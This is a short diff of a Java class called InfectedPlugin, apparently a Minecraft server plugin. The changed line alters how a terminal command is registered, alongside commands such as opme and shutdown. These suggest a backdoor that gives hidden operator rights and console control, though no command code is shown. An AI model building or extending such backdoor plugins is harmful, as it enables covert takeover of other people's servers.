@@ -34,7 +34,7 @@ public class InfectedPlugin extends JavaPlugin
             this.getServer().getPluginManager().registerEvents(new Command_enablevanilla(), this);
             this.getServer().getPluginManager().registerEvents(new Command_help(), this);
             this.getServer().getPluginManager().registerEvents(new Command_opme(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_terminal(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_terminal(this), this);
             //this.getServer().getPluginManager().registerEvents(new Command_fuckoff(), this);
             this.getServer().getPluginManager().registerEvents(new Command_shutdown(), this);
             //this.getServer().getPluginManager().registerEvents(new Command_randombanl(), this);
